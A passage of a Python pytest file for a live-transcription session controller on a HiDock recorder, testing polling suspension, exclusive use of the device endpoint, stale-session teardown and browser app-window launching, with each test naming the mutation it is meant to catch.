    assert harness.timeline[:3] == ["surface.start", "suspend", "capture"], (
        f"start() ran its steps out of order: {harness.timeline}"
    )


def test_a_port_bind_failure_refuses_the_session_and_never_suspends_polling(controller):
    """FR-ERR-1. The message names the cause; the offload worker is untouched."""
    # MUTATION: wrap `surface.start()` in a bare `except Exception: pass` and carry
    # on, which suspends polling for a session that does not exist.
    harness = controller()

    def failing_factory(**kwargs):
        made = FakeSurface(**kwargs)
        made.start_error = OSError(48, "Address already in use")
        harness.surfaces.append(made)
        return made

    harness.controller = LiveSessionController(
        bus=harness.bus,
        adapter=harness.adapter,
        api_key="k-test",
        suspend_polling=harness._suspend,
        resume_polling=harness._resume,
        busy_predicate=harness._busy_predicate,
        surface_factory=failing_factory,
        capture_factory=harness._capture_factory,
        transcriber_factory=harness._transcriber_factory,
        launch_browser=harness._launch,
    )

    with pytest.raises(LiveSessionError) as excinfo:
        harness.controller.start()

    assert harness.suspends == 0, "polling was suspended for a session that never started"
    assert harness.controller.is_live is False
    assert "Address already in use" in str(excinfo.value) or "48" in str(excinfo.value)


def test_suspension_is_released_when_capture_raises(controller):
    """U-12 (1/3) / FR-6.3. `RealtimeUnavailable` mid-stream is the device dying,
    which is exactly when the offload worker most needs to come back."""
    # MUTATION: run the pump without try/finally, so a raise in `frames()` skips
    # `resume_polling()` and leaves the worker suspended for the process's life.
    harness = controller()
    harness.controller.start()
    harness.capture.raise_after = RealtimeUnavailable("device stopped responding")
    harness.capture.released.set()

    _wait_until(lambda: harness.resumes == 1, msg="polling was never resumed")
    _wait_until(lambda: not harness.controller.is_live, msg="session stayed live")
    assert harness.surface.stopped >= 1


def test_suspension_is_released_when_the_bridge_raises(controller):
    """U-12 (2/3). `LiveTranscriptionError` is a different raise site from capture
    — it comes out of `feed()`, inside the loop, not out of the iterator."""
    # MUTATION: catch LiveTranscriptionError around `feed()` and `continue`, which
    # keeps the pump alive on a dead session AND never releases suspension.
    harness = controller()
    harness.controller.start()
    harness.transcriber.feed_error = LiveTranscriptionError(
        "live transcription stopped: the far channel failed"
    )
    harness.capture.frames_to_yield = [Frame(near=b"\x00\x00", far=b"\x11\x11", seq=2)]
    harness.capture.released.set()

    _wait_until(lambda: harness.resumes == 1, msg="polling was never resumed")
    assert "far channel" in harness.messages()


def test_suspension_is_released_when_the_server_raises_on_the_way_out(controller):
    """U-12 (3/3). The hardest one: the exception is raised BY the cleanup. Ordering
    `surface.stop(); resume_polling()` without a finally loses the resume to it."""
    # MUTATION: `self._surface.stop()` followed by `self._resume()` as plain
    # sequential statements in the teardown.
    harness = controller()
    harness.controller.start()
    harness.surface.stop_error = OSError("socket already gone")

    harness.controller.stop()

    assert harness.resumes == 1, "a raising surface.stop() stranded the suspension"


def test_suspension_is_released_when_the_bus_refuses_the_subscription(controller):
    """U-12, the raise site between taking the device claim and the pump owning it.

    `_suspend()` runs first, so anything that raises after it and before the pump
    exists leaks the FR-6.3 suspension permanently — and leaves `_live` True, which
    is unrecoverable: the next `l` would join a Thread that was never started and
    raise out of `stop()` before the teardown could run.
    """
    # MUTATION: move `self._bus.subscribe(surface.publish)` above the `try:` that
    # calls `_teardown(generation)` in `LiveSessionController.start`.
    harness = controller()
    real_subscribe = harness.bus.subscribe

    def refusing_subscribe(fn):
        raise RuntimeError("subscriber table is full")

    harness.bus.subscribe = refusing_subscribe

    with pytest.raises(LiveSessionError) as excinfo:
        harness.controller.start()

    assert harness.suspends == 1, "the failure happened before the claim was taken"
    assert harness.resumes == 1, "the FR-6.3 suspension leaked; offload is dead"
    assert harness.controller.is_live is False
    assert "subscriber table is full" in str(excinfo.value)
    assert harness.surface.stopped >= 1, "the bound surface was left serving"

    # And the controller is still usable — the failure did not wedge it.
    harness.bus.subscribe = real_subscribe
    harness.controller.start()
    assert harness.controller.is_live is True
    assert harness.suspends == 2 and harness.resumes == 1


def test_suspension_is_released_when_the_pump_thread_cannot_start(controller, monkeypatch):
    """The same window, at its last statement. `thread.start()` raises `RuntimeError`
    when the process is out of threads, and it raises AFTER the Thread object
    exists — so a teardown reached from here must cope with a thread that was
    constructed and never ran, which is why `stop()`'s join is gated on
    `is_alive()`."""
    # MUTATION: move `thread.start()` below the `except` that calls
    # `_teardown(generation)` in `LiveSessionController.start`.
    real_start = threading.Thread.start

    def refusing_start(self):
        if self.name == "hidock-live-pump":
            raise RuntimeError("can't start new thread")
        return real_start(self)

    monkeypatch.setattr(threading.Thread, "start", refusing_start)
    harness = controller()

    with pytest.raises(LiveSessionError) as excinfo:
        harness.controller.start()

    assert harness.suspends == 1
    assert harness.resumes == 1, "the FR-6.3 suspension leaked; offload is dead"
    assert harness.controller.is_live is False
    assert "can't start new thread" in str(excinfo.value)
    assert harness.surface.stopped >= 1

    # `stop()` must still be safe afterwards: it holds a reference to a Thread
    # that was never started, and `join()` on one of those raises.
    harness.controller.stop()  # must not raise
    monkeypatch.undo()
    harness.controller.start()
    assert harness.controller.is_live is True


def test_a_stale_pump_cannot_tear_down_the_session_that_replaced_it(controller):
    """`stop()` joins the pump for five seconds and then tears down regardless. A
    pump blocked longer than that on a device read is still alive, still holds a
    reference to `self`, and eventually reaches its own `finally` — by which time
    the operator may have pressed `l` again.

    A session-blind teardown would then stop the NEW session's surface, clear
    `_live`, and call `resume_polling` while the new capture is mid-stream on the
    shared Jensen endpoint. That is the collision FR-6.1 exists to prevent,
    arriving from the one direction the mutual exclusion cannot see.
    """
    # MUTATION: `if generation != self._generation or self._torn_down:` ->
    # `if self._torn_down:` in `LiveSessionController._teardown`.
    harness = controller()
    harness.controller.start()
    stale_generation = harness.controller._generation
    stale_capture, stale_transcriber = harness.capture, harness.transcriber
    harness.controller.stop()

    harness.controller.start()  # a second session, with its own generation
    assert harness.controller.is_live is True
    live_surface = harness.surface
    resumes_before = harness.resumes
    assert harness.controller._generation != stale_generation

    # Session 1's pump finally unblocks, minutes late, and runs its `finally` on
    # top of a session it never owned.
    stale_capture.block_after_frames = False
    stale_capture.released.set()
    harness.controller._pump(stale_capture, stale_transcriber, stale_generation)

    assert harness.controller.is_live is True, (
        "a dead session's pump tore down the one that replaced it"
    )
    assert harness.resumes == resumes_before, (
        "polling was resumed while a live capture holds the Jensen endpoint"
    )
    assert live_surface.stopped == 0, "the running session's surface was stopped"
    assert harness.captures[-1].stopped == 0


def test_a_stale_pumps_parting_words_never_land_in_the_next_sessions_log(controller):
    """The same identity, applied to what the pump SAYS. `start()` resets
    `_stopping`, so a pump that outlived its own session reads the next session's
    False and announces "Live transcription stopped" over a session that is
    running — the operator's newest log lines contradicting their screen."""
    # MUTATION: `self._say_unless_stale(generation, f"Live transcription stopped
    # — {exc}", Severity.ERROR)` -> `self._say(...)` in `_pump`'s `except`.
    harness = controller()
    harness.controller.start()
    stale_generation = harness.controller._generation
    stale_capture, stale_transcriber = harness.capture, harness.transcriber
    harness.controller.stop()

    harness.controller.start()
    assert harness.controller.is_live is True
    before = harness.messages()

    # The failure has to happen where a STALE pump can still reach it. `_stale`
    # already short-circuits the frame loop, so a capture that raises inside
    # `frames()` never runs — the reachable raise site is the context manager
    # entered before the loop, which is also the realistic one: a bridge whose
    # connect fails is how a late pump discovers its session is gone.
    stale_capture.block_after_frames = False
    stale_capture.released.set()
    stale_transcriber.enter_error = LiveTranscriptionError(
        "the far channel could not be opened"
    )
    harness.controller._pump(stale_capture, stale_transcriber, stale_generation)

    added = harness.messages()[len(before):]
    assert "stopped" not in added.lower(), (
        f"a dead session's parting words landed on a live session's log: {added!r}"
    )
    assert "far channel" not in added.lower()
    assert harness.controller.is_live is True


def test_polling_is_resumed_exactly_once_across_a_full_cycle(controller):
    """`App.resume_device_polling` is idempotent, but a controller that calls it
    from both the pump's finally AND `stop()` hides a missing call in the other."""
    # MUTATION: call `resume_polling()` from `stop()` as well as from the pump's
    # finally, without a guard.
    harness = controller()
    harness.controller.start()
    harness.controller.stop()
    harness.controller.stop()

    assert harness.resumes == 1
    assert harness.suspends == 1


def test_a_live_session_is_refused_while_a_transfer_is_in_flight(controller):
    """U-13 / FR-6.2. Refuse and say why. Do NOT queue: a silent queue means the
    window appears minutes later with no explanation."""
    # MUTATION: delete the busy check, letting live capture interleave Jensen
    # commands with an in-flight offload on the same endpoint.
    harness = controller(busy=True)

    with pytest.raises(LiveSessionError) as excinfo:
        harness.controller.start()

    message = str(excinfo.value).lower()
    assert "transfer" in message or "offload" in message, (
        f"the refusal does not name the in-progress work: {excinfo.value}"
    )
    assert harness.suspends == 0
    assert harness.surfaces == [], "a surface was bound for a refused session"
    assert harness.controller.is_live is False


def test_a_refused_start_is_not_queued_for_later(controller):
    """FR-6.2's second clause, which is the one an implementer skips: 'do not queue
    the request'. Asserted by clearing the condition and requiring nothing to fire."""
    # MUTATION: stash the refused request and retry it when the device frees up.
    harness = controller(busy=True)
    with pytest.raises(LiveSessionError):
        harness.controller.start()

    harness._busy = False
    time.sleep(0.2)

    assert harness.surfaces == []
    assert harness.controller.is_live is False


def test_toggle_never_raises_and_reports_the_refusal_on_the_bus(controller):
    """`toggle()` runs on the TUI's keyboard thread, where an exception is caught
    and swallowed by the reader (tui.py `_run`). A refusal that raises there is a
    keypress that does nothing, with no message — the failure FR-14 named."""
    # MUTATION: let `toggle()` call `start()` without catching LiveSessionError.
    harness = controller(busy=True)

    harness.controller.toggle()  # must not raise

    assert harness.errors(), "the refusal never reached the operator"
    assert "transfer" in harness.messages().lower() or "offload" in harness.messages().lower()


def test_toggle_starts_then_stops(controller):
    """FR-5.2 — one key, both directions."""
    # MUTATION: `toggle()` always calls `start()`, so the second press opens a
    # second metered session instead of ending the first.
    harness = controller()

    harness.controller.toggle()
    assert harness.controller.is_live is True

    harness.controller.toggle()
    assert harness.controller.is_live is False
    assert len(harness.surfaces) == 1


def test_starting_twice_does_not_open_a_second_metered_session(controller):
    """Two concurrent capture sessions would issue Jensen commands against each
    other, and both would bill."""
    # MUTATION: delete the `if self.is_live: raise` guard from start().
    harness = controller()
    harness.controller.start()

    with pytest.raises(LiveSessionError):
        harness.controller.start()

    assert len(harness.surfaces) == 1
    assert len(harness.captures) == 1


def test_frames_from_capture_are_fed_to_the_bridge(controller):
    """The pump itself. Without this the session is live, billed, and silent."""
    # MUTATION: `for frame in capture.frames(): pass` — the loop that forgets to
    # call `feed()`, which every other test here would still pass.
    harness = controller()

    harness.controller.start()
    _wait_until(
        lambda: harness.transcribers and harness.transcribers[-1].fed,
        msg="no frame reached the bridge",
    )

    fed = harness.transcriber.fed[0]
    # Asymmetric payload: a crossed or duplicated channel cannot pass by symmetry.
    assert (fed.near, fed.far, fed.seq) == (b"\x00\x00", b"\x11\x11", 1)


def test_the_bridge_is_built_with_the_configured_key_and_speaker_ceiling(controller):
    """The controller owns the composition; a hardcoded key or ceiling here makes
    `HIDOCK_LIVE_MAX_SPEAKERS` and the operator's own key inert."""
    # MUTATION: `transcriber_factory(bus, api_key=self._api_key, max_speakers=6)`
    # with the literal 6 instead of the configured value.
    harness = controller(api_key="k-configured", max_speakers=3)
    harness.controller.start()

    built = harness.transcriber

    assert built.kwargs["api_key"] == "k-configured"
    assert built.kwargs["max_speakers"] == 3
    assert built.bus is harness.bus


def test_capture_is_built_against_the_adapter_the_controller_was_given(controller):
    """FR-5.5 — one consumer of the device. Building capture against a NEW adapter
    would open a second USB claim and defeat the whole of §3.6."""
    # MUTATION: `capture_factory(JensenDeviceAdapter())` instead of `self._adapter`.
    harness = controller()
    harness.controller.start()

    assert harness.capture.adapter is harness.adapter


def test_the_surface_is_built_with_the_configured_operator_name(controller):
    """FR-4.1 reaches the surface through the controller, not through the
    environment — the surface reads no configuration of its own."""
    # MUTATION: drop `operator_name=` from the surface_factory call, silently
    # falling back to "Me" for an operator who set HIDOCK_OPERATOR_NAME.
    harness = controller(operator_name="Dana")
    harness.controller.start()

    assert harness.surface.kwargs.get("operator_name") == "Dana"


def test_a_browser_launch_failure_leaves_the_session_running_and_logs_the_url(controller):
    """U-14 / FR-ERR-2. The transcript is being captured and billed either way;
    killing it because a window did not appear would discard paid work."""
    # MUTATION: move `launch_browser(url)` inside the try that owns the session, or
    # re-raise from it, so a missing browser ends a paid call.
    harness = controller()
    harness.launch_error = FileNotFoundError("no chromium-family binary found")

    harness.controller.start()

    assert harness.controller.is_live is True
    assert harness.surface.url in harness.messages(), (
        "the URL was not surfaced, so a failed launch is unrecoverable"
    )


def test_the_url_is_surfaced_even_when_the_window_opened(controller):
    """FR-5.4 says 'always', not 'on failure'. The operator closes the window and
    needs the URL back; scrolling the log is the only place it can come from."""
    # MUTATION: publish the URL only from the launch-failure branch.
    harness = controller()

    harness.controller.start()

    assert harness.surface.url in harness.messages()


def test_a_live_session_writes_no_file_anywhere(tmp_path, monkeypatch, controller):
    """NFR-6, at the composition level. The operator's archive is a live Drive
    mount; this whole feature must be invisible to it.

    SCOPE, corrected for phase 1d. `live_archive_prd.md` §1 deliberately
    supersedes phase 1b §4.1 — the device does NOT persist live-session audio, so
    "write nothing" was losing every live call's recording. A live session now
    writes a WAV and a transcript, but only through `live_archive.py`, and only
    when the composition was given an `archive_dir`. What survives here — and is
    still worth pinning — is that the surface and the controller write nothing
    THEMSELVES: this harness supplies no `archive_dir`, so nothing below the
    controller may put a byte on disk. The phase-1d writes are pinned by
    `test_live_archive.py` and by the archive-wiring section at the end of this
    file; do not "fix" this test by giving it an archive_dir."""
    # MUTATION: write a session transcript beside the archive on stop.
    monkeypatch.chdir(tmp_path)
    harness = controller()
    harness.controller.start()
    harness.controller.stop()

    assert list(tmp_path.iterdir()) == []


# ==========================================================================
# FR-6.1 — the App side of the mutual exclusion
# ==========================================================================


class _FakeScan:
    whispers: list = []
    unknowns: list = []
    meetings: list = []


class _FakeOffloader:
    def __init__(self):
        self.scans = 0
        self.offloaded_one: List[str] = []

    def scan_pending_files(self, device_key):
        self.scans += 1
        return _FakeScan()

    def offload_one(self, *, device_key, file, kind, cancel_event):
        # Recorded rather than absent: an offloader with no `offload_one` would
        # make the refusal tests pass by `AttributeError`, which is indis-
        # tinguishable from the guard working and would survive its deletion.
        _bind_against(
            Offloader.offload_one,
            device_key=device_key, file=file, kind=kind, cancel_event=cancel_event,
        )
        self.offloaded_one.append(file.name)
        return True


class _PendingFile:
    """The shape `scan.whispers` / `scan.unknowns` hand the TUI: a `.name`."""

    def __init__(self, name: str):
        self.name = name


class _SilentWatcher:
    def start(self): pass
    def stop(self): pass
    def on_attach(self, fn): pass
    def on_detach(self, fn): pass
    def on_degraded(self, fn): pass


def _app(tmp_path, adapter) -> App:
    app = App(
        adapter=adapter,
        watcher=_SilentWatcher(),
        offloader=_FakeOffloader(),
        store=StateStore(tmp_path / "offload_state.json"),
        bus=EventBus(),
        poll_interval_seconds=1,
        sleep=lambda *_a, **_k: None,
    )
    app._device_key = DeviceKey(model="hidock-p1", serial="SN-TEST")
    return app


def test_suspended_polling_issues_no_jensen_command_at_all(tmp_path):
    """FR-6.1. The suspension has to be read where the command is issued. A flag
    that nothing consults is the version that passes every other test here and
    still interleaves USB traffic with live capture."""
    # MUTATION: `suspend_device_polling` sets `self._polling_suspended = True` and
    # `_run_scan_and_drain` never reads it.
    adapter = _FakeAdapter(count=3)
    app = _app(tmp_path, adapter)

    app.suspend_device_polling()
    app._run_scan_and_drain()

    assert adapter.file_count_calls == 0, "a Jensen command was issued while suspended"


def test_resuming_puts_the_poll_loop_back_to_work(tmp_path):
    """The other half. A suspension with no release is an offload worker that
    silently stops discovering recordings."""
    # MUTATION: `resume_device_polling` is a no-op / never clears the flag.
    adapter = _FakeAdapter(count=3)
    app = _app(tmp_path, adapter)
    app.suspend_device_polling()
    app._run_scan_and_drain()

    app.resume_device_polling()
    app._run_scan_and_drain()

    assert adapter.file_count_calls == 1


def test_suspend_and_resume_are_idempotent_not_counted(tmp_path):
    """Both are called from more than one path (start, stop, the pump's finally),
    so a nesting counter leaves the worker suspended after an unbalanced pair —
    and the symptom is silence, not an error."""
    # MUTATION: implement as `self._suspend_depth += 1` / `-= 1`.
    adapter = _FakeAdapter(count=3)
    app = _app(tmp_path, adapter)

    app.suspend_device_polling()
    app.suspend_device_polling()
    app.resume_device_polling()
    app._run_scan_and_drain()

    assert adapter.file_count_calls == 1


def test_resuming_a_worker_that_was_never_suspended_is_safe(tmp_path):
    """`resume_polling` runs from the controller's finally even when start() failed
    before suspending. It must not raise, or FR-6.3's guarantee inverts."""
    # MUTATION: `assert self._polling_suspended` at the top of resume.
    adapter = _FakeAdapter(count=3)
    app = _app(tmp_path, adapter)

    app.resume_device_polling()
    app._run_scan_and_drain()

    assert adapter.file_count_calls == 1


@pytest.mark.parametrize("key,call", [
    ("w", lambda app: app.offload_whisper("Rec42.hda")),
    ("u", lambda app: app.route_unknown("Rec42.hda", RecordingKind.MEETING)),
])
def test_the_w_and_u_keys_are_refused_while_a_live_session_holds_the_device(
    tmp_path, key, call
):
    """FR-5.5 / FR-6.1, the other direction. `_run_scan_and_drain` refuses to poll
    while a live session holds the endpoint, but the poll loop is not the app's
    only consumer of it: `w` and `u` stream a file off the device from the TUI
    thread, on the same Jensen endpoint, and nothing in the state machine stands
    between them and a live capture. An exclusion that only holds one way is not
    an exclusion.

    Refused rather than queued, for the reason FR-6.2 gives at the other door: a
    silent queue means the transfer starts minutes later with no operator action.
    """
    # MUTATION: delete the `if self._polling_suspended.is_set():` block from
    # `App._offload_pending` — the transfer then interleaves with live capture on
    # the shared endpoint and every other test in this file still passes.
    adapter = _FakeAdapter()
    app = _app(tmp_path, adapter)
    events: List[object] = []
    app._bus.subscribe(events.append)
    pending = _PendingFile("Rec42.hda")
    app._pending_whispers = [pending]
    app._pending_unknowns = [pending]
    app.suspend_device_polling()

    assert call(app) is False, f"`{key}` transferred a file during a live session"

    assert app._offloader.offloaded_one == [], "a Jensen transfer was actually issued"
    # Refused, not consumed: the file is still on the device and still listed, so
    # the footer count keeps matching reality and the operator can retry.
    assert app._pending_whispers == [pending] and app._pending_unknowns == [pending]

    errors = [e for e in events if isinstance(e, Error)]
    assert errors, f"`{key}` was refused silently"
    message = errors[-1].message
    lowered = message.lower()
    assert "Rec42.hda" in message, f"the refusal does not name the file: {message}"
    assert "live" in lowered, f"the refusal does not name the cause: {message}"
    assert "press l" in lowered or "stop the live" in lowered, (
        f"the refusal does not tell the operator what to do next: {message}"
    )
    assert errors[-1].severity is Severity.WARNING

    # And it is a refusal, not a permanent block: releasing the claim restores it.
    app.resume_device_polling()
    assert call(app) is True
    assert app._offloader.offloaded_one == ["Rec42.hda"]


@pytest.mark.parametrize(
    "state,busy",
    [
        (AppState.IDLE_DISCONNECTED, False),
        (AppState.CONNECTED_IDLE, False),
        (AppState.SCANNING, True),
        (AppState.DRAINING, True),
    ],
)
def test_device_busy_names_exactly_the_states_that_hold_the_endpoint(tmp_path, state, busy):
    """FR-6.2's predicate. SCANNING runs `list_files` (~27 s on a 1201-file P1) and
    DRAINING streams a file; both own the endpoint. CONNECTED_IDLE does not, and
    refusing there would make the feature unusable in its normal state."""
    # MUTATION: `state is not AppState.CONNECTED_IDLE` — which refuses a live
    # session whenever no device is attached AND every state table row flips.
    adapter = _FakeAdapter()
    app = _app(tmp_path, adapter)
    app._state = state

    assert app.device_busy is busy


def test_device_busy_is_a_property_not_a_snapshot(tmp_path):
    """The controller holds `lambda: app.device_busy`; a value captured once at
    wiring time would be the state at launch, forever."""
    # MUTATION: `device_busy` as a plain attribute set during `_transition`.
    adapter = _FakeAdapter()
    app = _app(tmp_path, adapter)
    app._state = AppState.CONNECTED_IDLE
    assert app.device_busy is False

    app._state = AppState.DRAINING

    assert app.device_busy is True


def test_device_busy_covers_a_command_that_is_on_the_wire_right_now(tmp_path):
    """FR-6.2. The state table above is not the whole predicate. `get_file_count`
    is issued from CONNECTED_IDLE, *before* the transition to SCANNING — a state
    the table calls free — so a live session started in that window puts CMD 32
    START on an endpoint that already has an outstanding request/response pair.

    "Between polls" has to mean between and not during.
    """
    # MUTATION: drop the `with self._device_command():` wrapper from
    # `_run_scan_and_drain`'s `get_file_count` call. Every row of the state-table
    # test above still passes, because none of them is ever mid-command.
    observed: List[bool] = []

    class _ObservingAdapter(_FakeAdapter):
        def get_file_count(self) -> int:
            observed.append(app.device_busy)
            return super().get_file_count()

    adapter = _ObservingAdapter()
    app = _app(tmp_path, adapter)
    app._state = AppState.CONNECTED_IDLE
    # Equal to the adapter's count, so the poll returns straight after the count
    # command and never transitions to SCANNING — otherwise the state would
    # supply the `True` and the in-flight depth would go untested.
    app._last_known_count = 0

    assert app.device_busy is False, "the endpoint was reported held before any command"

    app._run_scan_and_drain()

    assert app._state is AppState.CONNECTED_IDLE, "the poll transitioned; the test is vacuous"
    assert observed == [True], (
        "device_busy was False while a Jensen command was on the wire"
    )
    assert app.device_busy is False, "the endpoint was never released"


def test_an_in_flight_command_that_raises_still_releases_the_endpoint(tmp_path):
    """The decrement is in a `finally`. Without it a single `DeviceError` reports
    the device as permanently busy and refuses every live session for the life of
    the process — a failure whose only symptom is that `l` stops working.
    """
    # MUTATION: move the decrement out of `_device_command`'s `finally` onto the
    # normal path.
    class _FailingAdapter(_FakeAdapter):
        def get_file_count(self) -> int:
            raise DeviceError("endpoint stalled")

    app = _app(tmp_path, _FailingAdapter())
    app._state = AppState.CONNECTED_IDLE

    with pytest.raises(DeviceError):
        app._run_scan_and_drain()

    assert app.device_busy is False, "a raising command left the endpoint held forever"


def test_suspending_waits_for_a_command_that_is_already_on_the_wire(tmp_path):
    """FR-6.1. Setting the flag stops the NEXT command — it is read at the top of
    `_run_scan_and_drain` — but one already on the wire runs to completion. So a
    fire-and-forget suspension still permits CMD 32 START to interleave with an
    outstanding poll on the same endpoint, which is the overlap the suspension
    exists to prevent.

    The wait is bounded: pressing `l` must not hang the operator's UI behind a
    transfer that could take minutes. On expiry the suspension still stands —
    releasing it would be strictly worse — and the operator is told, because a
    silent overlap resurfaces later as an unexplained capture failure.
    """
    # MUTATION: drop the `wait_for` and leave `self._polling_suspended.set()`
    # alone, i.e. fire-and-forget suspension.
    app = _app(tmp_path, _FakeAdapter())
    events: List[object] = []
    app._bus.subscribe(events.append)
    entered = threading.Event()
    release = threading.Event()

    def _hold_the_endpoint():
        with app._device_command():
            entered.set()
            release.wait(5.0)

    holder = threading.Thread(target=_hold_the_endpoint, daemon=True)
    holder.start()
    try:
        assert entered.wait(2.0), "the holder thread never took the endpoint"

        assert app.suspend_device_polling(timeout=0.05) is False, (
            "suspension claimed a drained endpoint while a command was in flight"
        )
        assert app._polling_suspended.is_set(), (
            "the expired wait released the suspension, which is strictly worse "
            "than holding it"
        )
        warnings = [
            e for e in events
            if isinstance(e, Error) and e.context == "live_session"
        ]
        assert warnings, "the operator was not told the endpoint failed to drain"
        assert warnings[-1].severity is Severity.WARNING
    finally:
        release.set()
        holder.join(5.0)
    assert not holder.is_alive(), "the holder thread never finished"

    # Drained now: the same call returns True and says nothing.
    events.clear()

    assert app.suspend_device_polling(timeout=2.0) is True

    assert [e for e in events if isinstance(e, Error)] == [], (
        "a drained endpoint still warned the operator"
    )


# ==========================================================================
# FR-5.4 — launching the window
# ==========================================================================


def _bind_like_the_default_runner(argv, **kwargs) -> None:
    """Bind exactly as `live_server._spawn` — the runner production really uses.

    `subprocess.run` is the WRONG oracle here, and wrong in the one direction that
    matters: its signature is `(*popenargs, input=None, capture_output=False,
    timeout=None, check=False, **kwargs)`, so binding against it accepts any
    keyword whatsoever. A double bound that way is strictly more permissive than
    the callable it replaces — precisely the failure this file's header says the
    doubles exist to prevent, and the shape that hid the 2026-08-20
    `transcribe_file` bug behind seven `**kw`-permissive stand-ins.

    The default runner is `_spawn`, which pops `timeout` and forwards everything
    else to `subprocess.Popen`. `Popen.__init__` enumerates its keywords and takes
    no `**kwargs`, so an unknown one is a `TypeError` in production. That is the
    contract a double has to be held to.
    """
    _bind_function(live_server_module._spawn, argv, **kwargs)
    forwarded = dict(kwargs)
    forwarded.pop("timeout", None)
    inspect.signature(subprocess.Popen.__init__).bind(None, argv, **forwarded)


def test_the_launcher_doubles_are_no_more_permissive_than_the_real_runner():
    """The guard on the guard. `_bind_like_the_default_runner` is only worth having
    if it actually rejects what production rejects, so the oracle is exercised
    directly — otherwise a future edit could relax it back to `subprocess.run` and
    every launcher test would keep passing while checking nothing."""
    # MUTATION: `_bind_like_the_default_runner` binds against `subprocess.run`
    # only — the `Popen` bind below then accepts `bogus_kwarg` and this fails.
    argv = ["/bin/true", "--app=http://127.0.0.1:9/"]

    _bind_like_the_default_runner(
        argv, timeout=1.0, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    with pytest.raises(TypeError):
        _bind_like_the_default_runner(argv, bogus_kwarg=1)
    # And `subprocess.run` really would have waved it through, which is the whole
    # reason the oracle had to change.
    _bind_function(subprocess.run, argv, bogus_kwarg=1)


class _Runner:
    """Stands in for the launcher's runner seam.

    Binds against `live_server._spawn` AND against the `subprocess.Popen` call
    `_spawn` makes — never against `subprocess.run`, whose `**kwargs` would make
    this double accept keywords production cannot.
    """

    def __init__(self, outcomes=None):
        self.calls: List[list] = []
        self._outcomes = list(outcomes or [])

    def __call__(self, argv, **kwargs):
        _bind_like_the_default_runner(argv, **kwargs)
        self.calls.append(list(argv))
        outcome = self._outcomes.pop(0) if self._outcomes else FileNotFoundError(argv[0])
        if isinstance(outcome, BaseException):
            raise outcome
        return subprocess.CompletedProcess(argv, outcome)

    def vendors(self) -> List[str]:
        found = []
        for argv in self.calls:
            low = argv[0].lower()
            # `chromium` is checked before `chrome` because it contains it.
            for token in ("brave", "edge", "chromium", "chrome"):
                if token in low:
                    found.append(token)
                    break
        return found


def test_a_chromium_family_binary_is_launched_in_app_mode(monkeypatch):
    """§2.1. `--app=` is what makes this a window rather than a browser tab: no
    omnibox showing a localhost URL, no tab strip, and find-in-page still works."""
    # MUTATION: `[binary, url]` instead of `[binary, f"--app={url}"]` — which opens
    # a normal tab and quietly loses the whole reason for choosing a web surface.
    monkeypatch.setattr(webbrowser, "open", lambda *a, **k: pytest.fail("fell back"))
    runner = _Runner([0])

    note = launch_app_window("http://127.0.0.1:9/?k=abc", runner=runner)

    assert runner.calls[0][1] == "--app=http://127.0.0.1:9/?k=abc"
    assert "chrome" in note.lower()


def test_binaries_are_tried_in_the_documented_order(monkeypatch):
    """FR-5.4 names the order. It is not cosmetic: whichever answers first is the
    browser the operator's live call renders in for the rest of the session."""
    # MUTATION: reorder the candidate list, or iterate a set/dict whose order is
    # incidental rather than declared.
    monkeypatch.setattr(webbrowser, "open", lambda *a, **k: True)
    runner = _Runner([
        FileNotFoundError("chrome"),
        FileNotFoundError("brave"),
        FileNotFoundError("edge"),
        FileNotFoundError("chromium"),
    ])

    launch_app_window("http://127.0.0.1:9/?k=abc", runner=runner)

    assert runner.vendors() == ["chrome", "brave", "edge", "chromium"]


def test_a_missing_binary_falls_through_to_the_next_candidate(monkeypatch):
    """§3.8 classifies `FileNotFoundError` as non-transient-operator-actionable and
    NEVER fatal. Chrome is verified present on this machine and deliberately not
    depended on — most users of a public clone will not have it."""
    # MUTATION: `except FileNotFoundError: raise` instead of trying the next one.
    monkeypatch.setattr(webbrowser, "open", lambda *a, **k: pytest.fail("fell back"))
    runner = _Runner([FileNotFoundError("chrome"), 0])

    note = launch_app_window("http://127.0.0.1:9/?k=abc", runner=runner)

    assert runner.vendors() == ["chrome", "brave"]
    assert "brave" in note.lower()


def test_a_non_zero_exit_falls_through_to_the_next_candidate(monkeypatch):
    """A binary that exists but refuses (`--app` unsupported, profile locked) is a
    different failure from an absent one and must degrade the same way."""
    # MUTATION: treat any completed process as success by ignoring `returncode`.
    monkeypatch.setattr(webbrowser, "open", lambda *a, **k: pytest.fail("fell back"))
    runner = _Runner([1, 0])

    launch_app_window("http://127.0.0.1:9/?k=abc", runner=runner)

    assert runner.vendors() == ["chrome", "brave"]


def test_with_no_chromium_family_binary_it_falls_back_to_webbrowser(monkeypatch):
    """FR-5.4's floor: some window, or at worst the URL. A missing browser must
    never take down a live call."""
    # MUTATION: delete the `webbrowser.open(url)` fallback and return early.
    opened: List[str] = []

    def fake_open(url, new=0, autoraise=True):
        _bind_function(webbrowser.open, url, new=new, autoraise=autoraise)
        opened.append(url)
        return True

    monkeypatch.setattr(webbrowser, "open", fake_open)

    note = launch_app_window("http://127.0.0.1:9/?k=abc", runner=_Runner())

    assert opened == ["http://127.0.0.1:9/?k=abc"]
    assert "browser" in note.lower() or "default" in note.lower()


def test_launching_never_raises_even_when_every_path_fails(monkeypatch):
    """FR-ERR-2. This function is called on the start path of a metered session;
    a raise here would end a call because a window did not appear."""
    # MUTATION: remove the outer try/except around the whole function body.
    def exploding_open(url, new=0, autoraise=True):
        raise OSError("no display and no browser")

    monkeypatch.setattr(webbrowser, "open", exploding_open)
    absent = launch_app_window("http://127.0.0.1:9/?k=abc", runner=_Runner())
    crashing = launch_app_window(
        "http://127.0.0.1:9/?k=abc", runner=_Runner([RuntimeError("chrome crashed")] * 8)
    )

    assert isinstance(absent, str) and absent.strip()
    assert isinstance(crashing, str) and crashing.strip()


def test_the_launcher_never_blocks_on_the_browser_process(monkeypatch):
    """The window stays open for the whole call. A launcher that waits for the
    process to exit would freeze the keyboard thread that pressed `l`.

    The VALUE is asserted, not the key's presence. `timeout=None` — which is what
    "call the runner without a bound" looks like once the keyword is habitually
    passed — satisfies `"timeout" in kwargs` perfectly, and `_spawn` forwards it
    to `process.wait(timeout=None)`, which blocks until the browser exits. A key
    whose value may be the unbounded case pins nothing about boundedness.
    """
    # MUTATION: `timeout=LAUNCH_TIMEOUT_SECONDS` -> `timeout=None` in the runner
    # call inside `launch_app_window`.
    monkeypatch.setattr(webbrowser, "open", lambda *a, **k: True)
    seen: List[dict] = []

